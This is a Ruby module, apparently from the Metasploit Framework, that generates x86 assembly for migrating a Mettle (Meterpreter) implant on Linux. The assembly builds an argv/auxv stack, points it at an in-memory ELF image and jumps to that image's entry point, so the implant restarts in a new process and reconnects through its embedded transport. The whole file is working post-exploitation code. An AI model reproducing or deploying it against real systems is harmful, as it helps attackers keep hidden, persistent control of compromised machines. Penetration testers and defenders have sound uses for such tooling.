# -*- coding: binary -*-
# frozen_string_literal: true

require 'rex/elfparsey'

module Msf
  # Payload that supports reconnecting migrations on x86.
  module Payload::Linux::X86::MigrateHttp
    include Msf::Payload::Linux::X86::Migrate

    #
    # Starts a Mettle process image which reconnects using its embedded transport.
    #
    def generate_migrate(opts = {})
      entry_offset = elf_entry_point(opts.fetch(:payload))

      %(
      pop ebp                    ; child-readiness word
      pop eax                    ; discard source pid
      pop eax                    ; discard source transport fd
      pop esi                    ; process image address

      and esp, -16
      add esp, 64
      push 0x6d                  ; argv[0] = "m"
      mov edx, esp

      xor ebx, ebx
      push ebx                   ; AT_NULL value
      push ebx                   ; AT_NULL type
      push esi                   ; AT_BASE value
      push 7                     ; AT_BASE type
      push ebx                   ; envp terminator
      push ebx                   ; argv terminator
      push ebp                   ; argv[2] = child-readiness word
      push -1                    ; argv[1] = no inherited transport fd
      push edx                   ; argv[0]
      push 3                     ; argc

      add esi, #{entry_offset}
      jmp esi
    )
    end

    private

    def elf_entry_point(payload)
      Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload)).elf_header.e_entry
    end
  end
end
